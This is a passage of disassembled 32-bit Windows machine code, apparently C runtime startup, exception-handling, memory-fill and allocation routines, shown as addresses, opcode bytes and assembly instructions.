  4023e7:	c7 42 24 01 00 00 00 	movl   $0x1,0x24(%edx)
  4023ee:	b8 01 00 00 00       	mov    $0x1,%eax
  4023f3:	eb 57                	jmp    0x40244c
  4023f5:	6a 01                	push   $0x1
  4023f7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4023fa:	8b 48 14             	mov    0x14(%eax),%ecx
  4023fd:	51                   	push   %ecx
  4023fe:	8b 55 0c             	mov    0xc(%ebp),%edx
  402401:	8b 42 10             	mov    0x10(%edx),%eax
  402404:	50                   	push   %eax
  402405:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402408:	8b 51 08             	mov    0x8(%ecx),%edx
  40240b:	52                   	push   %edx
  40240c:	6a 00                	push   $0x0
  40240e:	8b 45 10             	mov    0x10(%ebp),%eax
  402411:	50                   	push   %eax
  402412:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402415:	8b 51 0c             	mov    0xc(%ecx),%edx
  402418:	52                   	push   %edx
  402419:	8b 45 08             	mov    0x8(%ebp),%eax
  40241c:	50                   	push   %eax
  40241d:	e8 4e 24 00 00       	call   0x404870
  402422:	83 c4 20             	add    $0x20,%esp
  402425:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402428:	83 79 24 00          	cmpl   $0x0,0x24(%ecx)
  40242c:	75 0d                	jne    0x40243b
  40242e:	8b 55 08             	mov    0x8(%ebp),%edx
  402431:	52                   	push   %edx
  402432:	8b 45 0c             	mov    0xc(%ebp),%eax
  402435:	50                   	push   %eax
  402436:	e8 95 fd ff ff       	call   0x4021d0
  40243b:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40243e:	8b 63 1c             	mov    0x1c(%ebx),%esp
  402441:	8b 6b 20             	mov    0x20(%ebx),%ebp
  402444:	ff 63 18             	jmp    *0x18(%ebx)
  402447:	b8 01 00 00 00       	mov    $0x1,%eax
  40244c:	5f                   	pop    %edi
  40244d:	5e                   	pop    %esi
  40244e:	5b                   	pop    %ebx
  40244f:	5d                   	pop    %ebp
  402450:	c3                   	ret
  402451:	cc                   	int3
  402452:	cc                   	int3
  402453:	cc                   	int3
  402454:	cc                   	int3
  402455:	cc                   	int3
  402456:	cc                   	int3
  402457:	cc                   	int3
  402458:	cc                   	int3
  402459:	cc                   	int3
  40245a:	cc                   	int3
  40245b:	cc                   	int3
  40245c:	cc                   	int3
  40245d:	cc                   	int3
  40245e:	cc                   	int3
  40245f:	cc                   	int3
  402460:	51                   	push   %ecx
  402461:	8b 44 24 08          	mov    0x8(%esp),%eax
  402465:	53                   	push   %ebx
  402466:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40246a:	55                   	push   %ebp
  40246b:	8b 48 10             	mov    0x10(%eax),%ecx
  40246e:	56                   	push   %esi
  40246f:	8b 70 0c             	mov    0xc(%eax),%esi
  402472:	57                   	push   %edi
  402473:	85 db                	test   %ebx,%ebx
  402475:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  402479:	8b ee                	mov    %esi,%ebp
  40247b:	8b fe                	mov    %esi,%edi
  40247d:	7c 35                	jl     0x4024b4
  40247f:	83 fe ff             	cmp    $0xffffffff,%esi
  402482:	75 05                	jne    0x402489
  402484:	e8 d7 2f 00 00       	call   0x405460
  402489:	8b 44 24 10          	mov    0x10(%esp),%eax
  40248d:	4e                   	dec    %esi
  40248e:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  402492:	8d 14 b6             	lea    (%esi,%esi,4),%edx
  402495:	8d 04 90             	lea    (%eax,%edx,4),%eax
  402498:	39 48 04             	cmp    %ecx,0x4(%eax)
  40249b:	7d 05                	jge    0x4024a2
  40249d:	3b 48 08             	cmp    0x8(%eax),%ecx
  4024a0:	7e 05                	jle    0x4024a7
  4024a2:	83 fe ff             	cmp    $0xffffffff,%esi
  4024a5:	75 05                	jne    0x4024ac
  4024a7:	8b ef                	mov    %edi,%ebp
  4024a9:	4b                   	dec    %ebx
  4024aa:	8b fe                	mov    %esi,%edi
  4024ac:	85 db                	test   %ebx,%ebx
  4024ae:	7d cf                	jge    0x40247f
  4024b0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4024b4:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4024b8:	8b 54 24 28          	mov    0x28(%esp),%edx
  4024bc:	46                   	inc    %esi
  4024bd:	89 31                	mov    %esi,(%ecx)
  4024bf:	89 2a                	mov    %ebp,(%edx)
  4024c1:	3b 68 0c             	cmp    0xc(%eax),%ebp
  4024c4:	77 04                	ja     0x4024ca
  4024c6:	3b f5                	cmp    %ebp,%esi
  4024c8:	76 05                	jbe    0x4024cf
  4024ca:	e8 91 2f 00 00       	call   0x405460
  4024cf:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4024d3:	8d 04 b6             	lea    (%esi,%esi,4),%eax
  4024d6:	5f                   	pop    %edi
  4024d7:	5e                   	pop    %esi
  4024d8:	5d                   	pop    %ebp
  4024d9:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4024dc:	5b                   	pop    %ebx
  4024dd:	59                   	pop    %ecx
  4024de:	c3                   	ret
  4024df:	90                   	nop
  4024e0:	55                   	push   %ebp
  4024e1:	8b ec                	mov    %esp,%ebp
  4024e3:	53                   	push   %ebx
  4024e4:	56                   	push   %esi
  4024e5:	57                   	push   %edi
  4024e6:	55                   	push   %ebp
  4024e7:	6a 00                	push   $0x0
  4024e9:	6a 00                	push   $0x0
  4024eb:	68 f8 24 40 00       	push   $0x4024f8
  4024f0:	ff 75 08             	push   0x8(%ebp)
  4024f3:	e8 a8 97 00 00       	call   0x40bca0
  4024f8:	5d                   	pop    %ebp
  4024f9:	5f                   	pop    %edi
  4024fa:	5e                   	pop    %esi
  4024fb:	5b                   	pop    %ebx
  4024fc:	8b e5                	mov    %ebp,%esp
  4024fe:	5d                   	pop    %ebp
  4024ff:	c3                   	ret
  402500:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402504:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  40250b:	b8 01 00 00 00       	mov    $0x1,%eax
  402510:	74 0f                	je     0x402521
  402512:	8b 44 24 08          	mov    0x8(%esp),%eax
  402516:	8b 54 24 10          	mov    0x10(%esp),%edx
  40251a:	89 02                	mov    %eax,(%edx)
  40251c:	b8 03 00 00 00       	mov    $0x3,%eax
  402521:	c3                   	ret
  402522:	53                   	push   %ebx
  402523:	56                   	push   %esi
  402524:	57                   	push   %edi
  402525:	8b 44 24 10          	mov    0x10(%esp),%eax
  402529:	50                   	push   %eax
  40252a:	6a fe                	push   $0xfffffffe
  40252c:	68 00 25 40 00       	push   $0x402500
  402531:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402538:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40253f:	8b 44 24 20          	mov    0x20(%esp),%eax
  402543:	8b 58 08             	mov    0x8(%eax),%ebx
  402546:	8b 70 0c             	mov    0xc(%eax),%esi
  402549:	83 fe ff             	cmp    $0xffffffff,%esi
  40254c:	74 2e                	je     0x40257c
  40254e:	3b 74 24 24          	cmp    0x24(%esp),%esi
  402552:	74 28                	je     0x40257c
  402554:	8d 34 76             	lea    (%esi,%esi,2),%esi
  402557:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  40255a:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40255e:	89 48 0c             	mov    %ecx,0xc(%eax)
  402561:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  402566:	75 12                	jne    0x40257a
  402568:	68 01 01 00 00       	push   $0x101
  40256d:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  402571:	e8 40 00 00 00       	call   0x4025b6
  402576:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  40257a:	eb c3                	jmp    0x40253f
  40257c:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402583:	83 c4 0c             	add    $0xc,%esp
  402586:	5f                   	pop    %edi
  402587:	5e                   	pop    %esi
  402588:	5b                   	pop    %ebx
  402589:	c3                   	ret
  40258a:	33 c0                	xor    %eax,%eax
  40258c:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  402593:	81 79 04 00 25 40 00 	cmpl   $0x402500,0x4(%ecx)
  40259a:	75 10                	jne    0x4025ac
  40259c:	8b 51 0c             	mov    0xc(%ecx),%edx
  40259f:	8b 52 0c             	mov    0xc(%edx),%edx
  4025a2:	39 51 08             	cmp    %edx,0x8(%ecx)
  4025a5:	75 05                	jne    0x4025ac
  4025a7:	b8 01 00 00 00       	mov    $0x1,%eax
  4025ac:	c3                   	ret
  4025ad:	53                   	push   %ebx
  4025ae:	51                   	push   %ecx
  4025af:	bb 84 98 42 00       	mov    $0x429884,%ebx
  4025b4:	eb 0a                	jmp    0x4025c0
  4025b6:	53                   	push   %ebx
  4025b7:	51                   	push   %ecx
  4025b8:	bb 84 98 42 00       	mov    $0x429884,%ebx
  4025bd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4025c0:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4025c3:	89 43 04             	mov    %eax,0x4(%ebx)
  4025c6:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  4025c9:	59                   	pop    %ecx
  4025ca:	5b                   	pop    %ebx
  4025cb:	c2 04 00             	ret    $0x4
  4025ce:	cc                   	int3
  4025cf:	cc                   	int3
  4025d0:	56                   	push   %esi
  4025d1:	e8 2a 09 00 00       	call   0x402f00
  4025d6:	a1 a8 03 43 00       	mov    0x4303a8,%eax
  4025db:	50                   	push   %eax
  4025dc:	e8 0f 0f 00 00       	call   0x4034f0
  4025e1:	8b 0d a4 03 43 00    	mov    0x4303a4,%ecx
  4025e7:	8b 15 a8 03 43 00    	mov    0x4303a8,%edx
  4025ed:	8b f1                	mov    %ecx,%esi
  4025ef:	83 c4 04             	add    $0x4,%esp
  4025f2:	2b f2                	sub    %edx,%esi
  4025f4:	83 c6 04             	add    $0x4,%esi
  4025f7:	3b c6                	cmp    %esi,%eax
  4025f9:	73 48                	jae    0x402643
  4025fb:	52                   	push   %edx
  4025fc:	e8 ef 0e 00 00       	call   0x4034f0
  402601:	8b 0d a8 03 43 00    	mov    0x4303a8,%ecx
  402607:	83 c4 04             	add    $0x4,%esp
  40260a:	83 c0 10             	add    $0x10,%eax
  40260d:	50                   	push   %eax
  40260e:	51                   	push   %ecx
  40260f:	e8 dc 2e 00 00       	call   0x4054f0
  402614:	83 c4 08             	add    $0x8,%esp
  402617:	85 c0                	test   %eax,%eax
  402619:	75 09                	jne    0x402624
  40261b:	e8 f0 08 00 00       	call   0x402f10
  402620:	33 c0                	xor    %eax,%eax
  402622:	5e                   	pop    %esi
  402623:	c3                   	ret
  402624:	8b 15 a4 03 43 00    	mov    0x4303a4,%edx
  40262a:	8b 35 a8 03 43 00    	mov    0x4303a8,%esi
  402630:	2b d6                	sub    %esi,%edx
  402632:	a3 a8 03 43 00       	mov    %eax,0x4303a8
  402637:	c1 fa 02             	sar    $0x2,%edx
  40263a:	8d 0c 90             	lea    (%eax,%edx,4),%ecx
  40263d:	89 0d a4 03 43 00    	mov    %ecx,0x4303a4
  402643:	8b 74 24 08          	mov    0x8(%esp),%esi
  402647:	89 31                	mov    %esi,(%ecx)
  402649:	a1 a4 03 43 00       	mov    0x4303a4,%eax
  40264e:	83 c0 04             	add    $0x4,%eax
  402651:	a3 a4 03 43 00       	mov    %eax,0x4303a4
  402656:	e8 b5 08 00 00       	call   0x402f10
  40265b:	8b c6                	mov    %esi,%eax
  40265d:	5e                   	pop    %esi
  40265e:	c3                   	ret
  40265f:	90                   	nop
  402660:	8b 44 24 04          	mov    0x4(%esp),%eax
  402664:	50                   	push   %eax
  402665:	e8 66 ff ff ff       	call   0x4025d0
  40266a:	83 c4 04             	add    $0x4,%esp
  40266d:	f7 d8                	neg    %eax
  40266f:	1b c0                	sbb    %eax,%eax
  402671:	f7 d8                	neg    %eax
  402673:	48                   	dec    %eax
  402674:	c3                   	ret
  402675:	90                   	nop
  402676:	90                   	nop
  402677:	90                   	nop
  402678:	90                   	nop
  402679:	90                   	nop
  40267a:	90                   	nop
  40267b:	90                   	nop
  40267c:	90                   	nop
  40267d:	90                   	nop
  40267e:	90                   	nop
  40267f:	90                   	nop
  402680:	68 80 00 00 00       	push   $0x80
  402685:	e8 b6 03 00 00       	call   0x402a40
  40268a:	83 c4 04             	add    $0x4,%esp
  40268d:	a3 a8 03 43 00       	mov    %eax,0x4303a8
  402692:	85 c0                	test   %eax,%eax
  402694:	75 0f                	jne    0x4026a5
  402696:	6a 18                	push   $0x18
  402698:	e8 d3 01 00 00       	call   0x402870
  40269d:	a1 a8 03 43 00       	mov    0x4303a8,%eax
  4026a2:	83 c4 04             	add    $0x4,%esp
  4026a5:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4026ab:	a1 a8 03 43 00       	mov    0x4303a8,%eax
  4026b0:	a3 a4 03 43 00       	mov    %eax,0x4303a4
  4026b5:	c3                   	ret
  4026b6:	90                   	nop
  4026b7:	90                   	nop
  4026b8:	90                   	nop
  4026b9:	90                   	nop
  4026ba:	90                   	nop
  4026bb:	90                   	nop
  4026bc:	90                   	nop
  4026bd:	90                   	nop
  4026be:	90                   	nop
  4026bf:	90                   	nop
  4026c0:	55                   	push   %ebp
  4026c1:	8b ec                	mov    %esp,%ebp
  4026c3:	6a ff                	push   $0xffffffff
  4026c5:	68 80 4e 42 00       	push   $0x424e80
  4026ca:	68 a8 60 40 00       	push   $0x4060a8
  4026cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4026d5:	50                   	push   %eax
  4026d6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4026dd:	83 c4 a8             	add    $0xffffffa8,%esp
  4026e0:	53                   	push   %ebx
  4026e1:	56                   	push   %esi
  4026e2:	57                   	push   %edi
  4026e3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4026e6:	ff 15 64 18 43 00    	call   *0x431864
  4026ec:	33 d2                	xor    %edx,%edx
  4026ee:	8a d4                	mov    %ah,%dl
  4026f0:	89 15 c8 ed 42 00    	mov    %edx,0x42edc8
  4026f6:	8b c8                	mov    %eax,%ecx
  4026f8:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4026fe:	89 0d c4 ed 42 00    	mov    %ecx,0x42edc4
  402704:	c1 e1 08             	shl    $0x8,%ecx
  402707:	03 ca                	add    %edx,%ecx
  402709:	89 0d c0 ed 42 00    	mov    %ecx,0x42edc0
  40270f:	c1 e8 10             	shr    $0x10,%eax
  402712:	a3 bc ed 42 00       	mov    %eax,0x42edbc
  402717:	e8 44 39 00 00       	call   0x406060
  40271c:	85 c0                	test   %eax,%eax
  40271e:	75 0a                	jne    0x40272a
  402720:	6a 1c                	push   $0x1c
  402722:	e8 49 01 00 00       	call   0x402870
  402727:	83 c4 04             	add    $0x4,%esp
  40272a:	e8 a1 2b 00 00       	call   0x4052d0
  40272f:	85 c0                	test   %eax,%eax
  402731:	75 0a                	jne    0x40273d
  402733:	6a 10                	push   $0x10
  402735:	e8 36 01 00 00       	call   0x402870
  40273a:	83 c4 04             	add    $0x4,%esp
  40273d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402744:	e8 07 37 00 00       	call   0x405e50
  402749:	e8 02 19 00 00       	call   0x404050
  40274e:	ff 15 44 17 43 00    	call   *0x431744
  402754:	a3 b0 03 43 00       	mov    %eax,0x4303b0
  402759:	e8 92 35 00 00       	call   0x405cf0
  40275e:	a3 ac ed 42 00       	mov    %eax,0x42edac
  402763:	85 c0                	test   %eax,%eax
  402765:	74 09                	je     0x402770
  402767:	a1 b0 03 43 00       	mov    0x4303b0,%eax
  40276c:	85 c0                	test   %eax,%eax
  40276e:	75 0a                	jne    0x40277a
  402770:	6a ff                	push   $0xffffffff
  402772:	e8 89 06 00 00       	call   0x402e00
  402777:	83 c4 04             	add    $0x4,%esp
  40277a:	e8 c1 32 00 00       	call   0x405a40
  40277f:	e8 cc 31 00 00       	call   0x405950
  402784:	e8 47 06 00 00       	call   0x402dd0
  402789:	8b 35 b0 03 43 00    	mov    0x4303b0,%esi
  40278f:	89 75 9c             	mov    %esi,-0x64(%ebp)
  402792:	80 3e 22             	cmpb   $0x22,(%esi)
  402795:	0f 85 be 00 00 00    	jne    0x402859
  40279b:	46                   	inc    %esi
  40279c:	89 75 9c             	mov    %esi,-0x64(%ebp)
  40279f:	8a 06                	mov    (%esi),%al
  4027a1:	3c 22                	cmp    $0x22,%al
  4027a3:	74 1c                	je     0x4027c1
  4027a5:	84 c0                	test   %al,%al
  4027a7:	74 18                	je     0x4027c1
  4027a9:	25 ff 00 00 00       	and    $0xff,%eax
  4027ae:	50                   	push   %eax
  4027af:	e8 3c 31 00 00       	call   0x4058f0
  4027b4:	83 c4 04             	add    $0x4,%esp
  4027b7:	85 c0                	test   %eax,%eax
  4027b9:	74 e0                	je     0x40279b
  4027bb:	46                   	inc    %esi
  4027bc:	89 75 9c             	mov    %esi,-0x64(%ebp)
  4027bf:	eb da                	jmp    0x40279b
  4027c1:	80 3e 22             	cmpb   $0x22,(%esi)
  4027c4:	75 04                	jne    0x4027ca
  4027c6:	46                   	inc    %esi
  4027c7:	89 75 9c             	mov    %esi,-0x64(%ebp)
  4027ca:	8a 06                	mov    (%esi),%al
  4027cc:	84 c0                	test   %al,%al
  4027ce:	74 0a                	je     0x4027da
  4027d0:	3c 20                	cmp    $0x20,%al
  4027d2:	77 06                	ja     0x4027da
  4027d4:	46                   	inc    %esi
  4027d5:	89 75 9c             	mov    %esi,-0x64(%ebp)
  4027d8:	eb f0                	jmp    0x4027ca
  4027da:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  4027e1:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4027e4:	50                   	push   %eax
  4027e5:	ff 15 48 17 43 00    	call   *0x431748
  4027eb:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  4027ef:	74 0a                	je     0x4027fb
  4027f1:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4027f4:	25 ff ff 00 00       	and    $0xffff,%eax
  4027f9:	eb 05                	jmp    0x402800
  4027fb:	b8 0a 00 00 00       	mov    $0xa,%eax
  402800:	50                   	push   %eax
  402801:	56                   	push   %esi
  402802:	6a 00                	push   $0x0
  402804:	6a 00                	push   $0x0
  402806:	ff 15 4c 17 43 00    	call   *0x43174c
  40280c:	50                   	push   %eax
  40280d:	e8 05 cc 00 00       	call   0x40f417
  402812:	89 45 a0             	mov    %eax,-0x60(%ebp)
  402815:	50                   	push   %eax
  402816:	e8 e5 05 00 00       	call   0x402e00
  40281b:	eb 21                	jmp    0x40283e
  40281d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402820:	8b 08                	mov    (%eax),%ecx
  402822:	8b 09                	mov    (%ecx),%ecx
  402824:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  402827:	50                   	push   %eax
  402828:	51                   	push   %ecx
  402829:	e8 72 2e 00 00       	call   0x4056a0
  40282e:	83 c4 08             	add    $0x8,%esp
  402831:	c3                   	ret
  402832:	8b 65 e8             	mov    -0x18(%ebp),%esp
  402835:	8b 55 98             	mov    -0x68(%ebp),%edx
  402838:	52                   	push   %edx
  402839:	e8 e2 05 00 00       	call   0x402e20
  40283e:	83 c4 04             	add    $0x4,%esp
  402841:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402848:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40284b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402852:	5f                   	pop    %edi
  402853:	5e                   	pop    %esi
  402854:	5b                   	pop    %ebx
  402855:	8b e5                	mov    %ebp,%esp
  402857:	5d                   	pop    %ebp
  402858:	c3                   	ret
  402859:	80 3e 20             	cmpb   $0x20,(%esi)
  40285c:	0f 86 68 ff ff ff    	jbe    0x4027ca
  402862:	46                   	inc    %esi
  402863:	89 75 9c             	mov    %esi,-0x64(%ebp)
  402866:	eb f1                	jmp    0x402859
  402868:	90                   	nop
  402869:	90                   	nop
  40286a:	90                   	nop
  40286b:	90                   	nop
  40286c:	90                   	nop
  40286d:	90                   	nop
  40286e:	90                   	nop
  40286f:	90                   	nop
  402870:	83 3d b4 ed 42 00 01 	cmpl   $0x1,0x42edb4
  402877:	75 05                	jne    0x40287e
  402879:	e8 02 39 00 00       	call   0x406180
  40287e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402882:	50                   	push   %eax
  402883:	e8 38 39 00 00       	call   0x4061c0
  402888:	83 c4 04             	add    $0x4,%esp
  40288b:	68 ff 00 00 00       	push   $0xff
  402890:	ff 15 94 98 42 00    	call   *0x429894
  402896:	83 c4 04             	add    $0x4,%esp
  402899:	c3                   	ret
  40289a:	90                   	nop
  40289b:	90                   	nop
  40289c:	90                   	nop
  40289d:	90                   	nop
  40289e:	90                   	nop
  40289f:	90                   	nop
  4028a0:	56                   	push   %esi
  4028a1:	8b f1                	mov    %ecx,%esi
  4028a3:	6a 1b                	push   $0x1b
  4028a5:	c7 06 94 4e 42 00    	movl   $0x424e94,(%esi)
  4028ab:	e8 20 3b 00 00       	call   0x4063d0
  4028b0:	8b 76 04             	mov    0x4(%esi),%esi
  4028b3:	83 c4 04             	add    $0x4,%esp
  4028b6:	85 f6                	test   %esi,%esi
  4028b8:	74 09                	je     0x4028c3
  4028ba:	56                   	push   %esi
  4028bb:	e8 50 02 00 00       	call   0x402b10
  4028c0:	83 c4 04             	add    $0x4,%esp
  4028c3:	6a 1b                	push   $0x1b
  4028c5:	e8 86 3b 00 00       	call   0x406450
  4028ca:	83 c4 04             	add    $0x4,%esp
  4028cd:	5e                   	pop    %esi
  4028ce:	c3                   	ret
  4028cf:	90                   	nop
  4028d0:	56                   	push   %esi
  4028d1:	8b f1                	mov    %ecx,%esi
  4028d3:	e8 c8 ff ff ff       	call   0x4028a0
  4028d8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4028dd:	74 09                	je     0x4028e8
  4028df:	56                   	push   %esi
  4028e0:	e8 b3 dd 00 00       	call   0x410698
  4028e5:	83 c4 04             	add    $0x4,%esp
  4028e8:	8b c6                	mov    %esi,%eax
  4028ea:	5e                   	pop    %esi
  4028eb:	c2 04 00             	ret    $0x4
  4028ee:	90                   	nop
  4028ef:	90                   	nop
  4028f0:	6a ff                	push   $0xffffffff
  4028f2:	50                   	push   %eax
  4028f3:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4028f9:	50                   	push   %eax
  4028fa:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4028fe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402905:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  402909:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  40290d:	50                   	push   %eax
  40290e:	c3                   	ret
  40290f:	cc                   	int3
  402910:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402914:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402918:	85 d2                	test   %edx,%edx
  40291a:	74 47                	je     0x402963
  40291c:	33 c0                	xor    %eax,%eax
  40291e:	8a 44 24 08          	mov    0x8(%esp),%al
  402922:	57                   	push   %edi
  402923:	8b f9                	mov    %ecx,%edi
  402925:	83 fa 04             	cmp    $0x4,%edx
  402928:	72 2d                	jb     0x402957
  40292a:	f7 d9                	neg    %ecx
  40292c:	83 e1 03             	and    $0x3,%ecx
  40292f:	74 08                	je     0x402939
  402931:	2b d1                	sub    %ecx,%edx
  402933:	88 07                	mov    %al,(%edi)
  402935:	47                   	inc    %edi
  402936:	49                   	dec    %ecx
  402937:	75 fa                	jne    0x402933
  402939:	8b c8                	mov    %eax,%ecx
  40293b:	c1 e0 08             	shl    $0x8,%eax
  40293e:	03 c1                	add    %ecx,%eax
  402940:	8b c8                	mov    %eax,%ecx
  402942:	c1 e0 10             	shl    $0x10,%eax
  402945:	03 c1                	add    %ecx,%eax
  402947:	8b ca                	mov    %edx,%ecx
  402949:	83 e2 03             	and    $0x3,%edx
  40294c:	c1 e9 02             	shr    $0x2,%ecx
  40294f:	74 06                	je     0x402957
  402951:	f3 ab                	rep stos %eax,%es:(%edi)
  402953:	85 d2                	test   %edx,%edx
  402955:	74 06                	je     0x40295d
  402957:	88 07                	mov    %al,(%edi)
  402959:	47                   	inc    %edi
  40295a:	4a                   	dec    %edx
  40295b:	75 fa                	jne    0x402957
  40295d:	8b 44 24 08          	mov    0x8(%esp),%eax
  402961:	5f                   	pop    %edi
  402962:	c3                   	ret
  402963:	8b 44 24 04          	mov    0x4(%esp),%eax
  402967:	c3                   	ret
  402968:	cc                   	int3
  402969:	cc                   	int3
  40296a:	cc                   	int3
  40296b:	cc                   	int3
  40296c:	cc                   	int3
  40296d:	cc                   	int3
  40296e:	cc                   	int3
  40296f:	cc                   	int3
  402970:	a1 04 ef 42 00       	mov    0x42ef04,%eax
  402975:	53                   	push   %ebx
  402976:	56                   	push   %esi
  402977:	57                   	push   %edi
  402978:	85 c0                	test   %eax,%eax
  40297a:	75 16                	jne    0x402992
  40297c:	8b 44 24 14          	mov    0x14(%esp),%eax
  402980:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402984:	50                   	push   %eax
  402985:	51                   	push   %ecx
  402986:	e8 d5 3b 00 00       	call   0x406560
  40298b:	83 c4 08             	add    $0x8,%esp
  40298e:	5f                   	pop    %edi
  40298f:	5e                   	pop    %esi
  402990:	5b                   	pop    %ebx
  402991:	c3                   	ret
  402992:	6a 19                	push   $0x19
  402994:	e8 37 3a 00 00       	call   0x4063d0
  402999:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40299d:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4029a1:	83 c4 04             	add    $0x4,%esp
  4029a4:	66 0f b6 37          	movzbw (%edi),%si
  4029a8:	66 85 f6             	test   %si,%si
  4029ab:	74 46                	je     0x4029f3
  4029ad:	b1 04                	mov    $0x4,%cl
  4029af:	8b d6                	mov    %esi,%edx
  4029b1:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4029b7:	84 8a 01 ee 42 00    	test   %cl,0x42ee01(%edx)
  4029bd:	74 1e                	je     0x4029dd
  4029bf:	8a 47 01             	mov    0x1(%edi),%al
  4029c2:	47                   	inc    %edi
  4029c3:	84 c0                	test   %al,%al
  4029c5:	74 4a                	je     0x402a11
  4029c7:	81 e6 ff ff 00 00    	and    $0xffff,%esi
  4029cd:	25 ff 00 00 00       	and    $0xff,%eax
  4029d2:	c1 e6 08             	shl    $0x8,%esi
  4029d5:	0b f0                	or     %eax,%esi
  4029d7:	3b de                	cmp    %esi,%ebx
  4029d9:	74 46                	je     0x402a21
  4029db:	eb 0b                	jmp    0x4029e8
  4029dd:	8b c6                	mov    %esi,%eax
  4029df:	25 ff ff 00 00       	and    $0xffff,%eax
  4029e4:	3b d8                	cmp    %eax,%ebx
  4029e6:	74 0b                	je     0x4029f3
  4029e8:	66 0f b6 77 01       	movzbw 0x1(%edi),%si
  4029ed:	47                   	inc    %edi
  4029ee:	66 85 f6             	test   %si,%si
  4029f1:	75 bc                	jne    0x4029af
  4029f3:	6a 19                	push   $0x19
  4029f5:	e8 56 3a 00 00       	call   0x406450
  4029fa:	81 e6 ff ff 00 00    	and    $0xffff,%esi
  402a00:	83 c4 04             	add    $0x4,%esp
  402a03:	33 c0                	xor    %eax,%eax
  402a05:	3b de                	cmp    %esi,%ebx
  402a07:	0f 95 c0             	setne  %al
  402a0a:	48                   	dec    %eax
  402a0b:	23 c7                	and    %edi,%eax
  402a0d:	5f                   	pop    %edi
  402a0e:	5e                   	pop    %esi
  402a0f:	5b                   	pop    %ebx
  402a10:	c3                   	ret
  402a11:	6a 19                	push   $0x19
  402a13:	e8 38 3a 00 00       	call   0x406450
  402a18:	83 c4 04             	add    $0x4,%esp
  402a1b:	33 c0                	xor    %eax,%eax
  402a1d:	5f                   	pop    %edi
  402a1e:	5e                   	pop    %esi
  402a1f:	5b                   	pop    %ebx
  402a20:	c3                   	ret
  402a21:	6a 19                	push   $0x19
  402a23:	e8 28 3a 00 00       	call   0x406450
  402a28:	83 c4 04             	add    $0x4,%esp
  402a2b:	8d 47 ff             	lea    -0x1(%edi),%eax
  402a2e:	5f                   	pop    %edi
  402a2f:	5e                   	pop    %esi
  402a30:	5b                   	pop    %ebx
  402a31:	c3                   	ret
  402a32:	90                   	nop
  402a33:	90                   	nop
  402a34:	90                   	nop
  402a35:	90                   	nop
  402a36:	90                   	nop
  402a37:	90                   	nop
  402a38:	90                   	nop
  402a39:	90                   	nop
  402a3a:	90                   	nop
  402a3b:	90                   	nop
  402a3c:	90                   	nop
  402a3d:	90                   	nop
  402a3e:	90                   	nop
  402a3f:	90                   	nop
  402a40:	a1 d8 f0 42 00       	mov    0x42f0d8,%eax
  402a45:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402a49:	50                   	push   %eax
  402a4a:	51                   	push   %ecx
  402a4b:	e8 10 00 00 00       	call   0x402a60
  402a50:	83 c4 08             	add    $0x8,%esp
  402a53:	c3                   	ret
  402a54:	90                   	nop
  402a55:	90                   	nop
  402a56:	90                   	nop
  402a57:	90                   	nop
  402a58:	90                   	nop
  402a59:	90                   	nop
  402a5a:	90                   	nop
  402a5b:	90                   	nop
  402a5c:	90                   	nop
  402a5d:	90                   	nop
  402a5e:	90                   	nop
  402a5f:	90                   	nop
  402a60:	56                   	push   %esi
  402a61:	8b 74 24 08          	mov    0x8(%esp),%esi
  402a65:	83 fe e0             	cmp    $0xffffffe0,%esi
  402a68:	57                   	push   %edi
  402a69:	77 34                	ja     0x402a9f
  402a6b:	85 f6                	test   %esi,%esi
